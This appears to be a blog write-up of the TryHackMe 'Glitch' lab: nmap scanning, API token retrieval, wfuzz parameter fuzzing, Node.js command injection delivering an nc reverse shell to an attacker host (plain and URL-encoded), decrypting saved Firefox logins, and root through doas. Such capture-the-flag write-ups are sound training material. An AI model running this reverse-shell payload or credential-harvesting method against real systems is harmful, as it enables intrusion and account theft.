---
image: /assets/img/glitch/glitch.png
layout: post
title: GLITCH
date: 2021-05-05 00:00:01 +5:30
categories: [TryHackMe, Easy]
tags: [] # add tag
---

## Summary
>* Enum web app and get access token using console
>* Use token to get /api/items
>* Changing the method to Post
>* Fuzzing to find parameter
>* Using firefox saved logins
>* doas as root

## Walkthrough

Starting with NMAP scan

```bash
┌──(kali㉿kali)-[~/Desktop/thm/glitch]
└─$ nmap -v 10.10.69.202 -oN glitch.nmap                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 01:58 GMT
Initiating Ping Scan at 01:58
Scanning 10.10.69.202 [2 ports]
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 01:58 (0:00:00 remaining)
Completed Ping Scan at 01:58, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:58
Completed Parallel DNS resolution of 1 host. at 01:58, 0.04s elapsed
Initiating Connect Scan at 01:58
Scanning 10.10.69.202 [1000 ports]
Discovered open port 80/tcp on 10.10.69.202
Completed Connect Scan at 01:58, 25.32s elapsed (1000 total ports)
Nmap scan report for 10.10.69.202
Host is up (0.32s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds

┌──(kali㉿kali)-[~/Desktop/thm/glitch]
└─$ sudo nmap -sC -sV -p80 10.10.69.202
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 01:59 GMT
Nmap scan report for 10.10.69.202
Host is up (0.38s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.99 seconds

```

I got bad Gateway in starting but the webserver started and got a page with title access denied.

![webpage](/assets/img/glitch/web1.png)

Looking into it's code.

![web2](/assets/img/glitch/web2.png)

We can see the little js fuction when called fetch from /api/access and get a response in console.

![web3](/assets/img/glitch/web3.png)

Using this token we had another page

![web4](/assets/img/glitch/web4.png)

```bash
┌──(kali㉿kali)-[~/Desktop/thm/glitch/firefox_decrypt]
└─$  wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 400 -X POST -u http://10.10.69.202/api/items\?FUZZ\=test
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.69.202/api/items?FUZZ=test
Total requests: 1659

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000322:   500        10 L     64 W       1081 Ch     "cmd"
```

## Exploitation

After getting end point cmd Checking it looks like node js app using burp encoder

```javascript
require("child_process").exec('mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol')
```

```bash
┌──(kali㉿kali)-[~/Desktop/thm/glitch]
└─$ curl -s -X POST --cookie "token=this_is_not_real" "http://10.10.69.202/api/items?cmd=require(\"child_process\").exec('%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%6c%6f%6c%3b%6e%63%20%31%30%2e%31%37%2e%31%2e%38%35%20%38%30%20%30%3c%2f%74%6d%70%2f%6c%6f%6c%20%7c%20%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%20%7c%20%74%65%65%20%2f%74%6d%70%2f%6c%6f%6c')"
vulnerability_exploited [object Object]                                                                        
```

Got User.

## PrivEsc

Poking here and there got .firefox dir looking into it reveals saved logins

```bash
ls -la
total 20
drwxrwxrwx  4 user user 4096 Jan 27 10:32  .
drwxr-xr-x  8 user user 4096 Jan 27 10:33  ..
drwxrwxrwx 11 user user 4096 Jan 27 10:32  b5w4643p.default-release
drwxrwxrwx  3 user user 4096 Jan 27 10:32 'Crash Reports'
-rwxrwxr-x  1 user user  259 Jan 27 10:32  profiles.ini
user@ubuntu:~/.firefox$ cd 'Crash
cd 'Crash Reports'/
user@ubuntu:~/.firefox/Crash Reports$ ls
ls
events  InstallTime20200720193547
user@ubuntu:~/.firefox/Crash Reports$ ls -la
ls -la
total 16
drwxrwxrwx 3 user user 4096 Jan 27 10:32 .
drwxrwxrwx 4 user user 4096 Jan 27 10:32 ..
drwxrwxrwx 2 user user 4096 Jan 27 10:32 events
-rwxrwxr-x 1 user user   10 Jan 27 10:32 InstallTime20200720193547
user@ubuntu:~/.firefox/Crash Reports$ cd even
cd events/
user@ubuntu:~/.firefox/Crash Reports/events$ ls
ls
user@ubuntu:~/.firefox/Crash Reports/events$ ls -la
ls -la
total 8
drwxrwxrwx 2 user user 4096 Jan 27 10:32 .
drwxrwxrwx 3 user user 4096 Jan 27 10:32 ..
user@ubuntu:~/.firefox/Crash Reports/events$ cd ../.
cd ../.
user@ubuntu:~/.firefox/Crash Reports$ cd ..
lscd ..

user@ubuntu:~/.firefox$ ls
 b5w4643p.default-release  'Crash Reports'   profiles.ini
user@ubuntu:~/.firefox$ cd b5
cd b5w4643p.default-release/
user@ubuntu:~/.firefox/b5w4643p.default-release$ ls
ls
addons.json                 permissions.sqlite
addonStartup.json.lz4       pkcs11.txt
AlternateServices.txt       places.sqlite
bookmarkbackups             prefs.js
cert9.db                    protections.sqlite
compatibility.ini           saved-telemetry-pings
containers.json             search.json.mozlz4
content-prefs.sqlite        SecurityPreloadState.txt
cookies.sqlite              security_state
crashes                     sessionCheckpoints.json
datareporting               sessionstore-backups
extension-preferences.json  sessionstore.jsonlz4
extensions                  shield-preference-experiments.json
extensions.json             SiteSecurityServiceState.txt
favicons.sqlite             storage
formhistory.sqlite          storage.sqlite
handlers.json               times.json
key4.db                     TRRBlacklist.txt
lock                        webappsstore.sqlite
logins.json                 xulstore.json
minidumps
user@ubuntu:~/.firefox/b5w4643p.default-release$ cat logins.json
cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://glitch.thm","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCP5HBZJq0+DBAjWdWrk7qo4eA==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPfxo08d5UxEBBB9aJ+chJC2pDccxKhqs1UH","guid":"{9c80e9f2-0377-496e-9404-4411eb94783b}","encType":1,"timeCreated":1610645982812,"timeLastUsed":1610645982812,"timePasswordChanged":1610645982812,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}user@ubuntu:~/.firefox/b5w4643p.default-release$
```

Transfering the files

Firefox decrypt:
<https://github.com/unode/firefox_decrypt>
```bash
┌──(kali㉿kali)-[~/Desktop/thm/glitch/firefox_decrypt]
└─$ python3 firefox_decrypt.py ./.firefox/b5w4643p.default-release                                                                2 ⨯
2021-05-05 03:54:32,264 - WARNING - profile.ini not found in ./.firefox/b5w4643p.default-release
2021-05-05 03:54:32,264 - WARNING - Continuing and assuming './.firefox/b5w4643p.default-release' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

After becoming v0id looking for dir get doas which is actually serve  like sudo.

```bash
v0id@ubuntu:/opt/doas$ ls
compat  doas.1        doas.c       doas.conf.5.final  doas.h  env.c  LICENSE   parse.y    vidoas    vidoas.8.final  y.tab.c
doas    doas.1.final  doas.conf.5  doas.conf.sample   doas.o  env.o  Makefile  README.md  vidoas.8  vidoas.final    y.tab.o
v0id@ubuntu:/opt/doas$ ./doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
v0id@ubuntu:/opt/doas$ ls -la /bin/domainname ^C
v0id@ubuntu:/opt/doas$ doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
v0id@ubuntu:/opt/doas$ doas -u root^C
v0id@ubuntu:/opt/doas$ where doas
where: command not found
v0id@ubuntu:/opt/doas$ ehich^C
v0id@ubuntu:/opt/doas$ which doas
/usr/local/bin/doas
v0id@ubuntu:/opt/doas$ ls -la /usr/local/bin/doas
-rwsr-xr-x 1 root root 37952 Jan 15 14:14 /usr/local/bin/doas
v0id@ubuntu:/opt/doas$ /usr/local/bin/doas -u root id
Password:
uid=0(root) gid=0(root) groups=0(root)
v0id@ubuntu:/opt/doas$ /usr/local/bin/doas -u root /bin/bash
Password:
root@ubuntu:/opt/doas#
```

Rooted
